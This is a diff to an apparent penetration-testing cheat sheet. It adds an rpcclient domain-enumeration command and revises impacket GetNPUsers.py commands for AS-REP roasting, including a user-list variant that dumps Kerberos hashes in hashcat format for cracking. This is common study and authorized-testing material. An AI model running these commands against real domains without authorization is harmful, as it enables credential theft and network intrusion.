@@ -415,6 +415,7 @@ dsr_enumtrustdom
 getusername
 
 # Query user, group etc informations
+querydominfo
 queryuser RID
 querygroupmem519
 queryaliasmem builtin 0x220
@@ -646,7 +647,10 @@ upload {FILE.exe}
 ```bash
 
 # ASREP ROAST
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip {IP ADDRESS} -request '{DC.NAME}/' -format hashcat
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -format hashcat
+
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -userfile {USER.txt} -format hashcat
+
 
 # Bloodhound
 sudo ./usr/bin/neo4j console
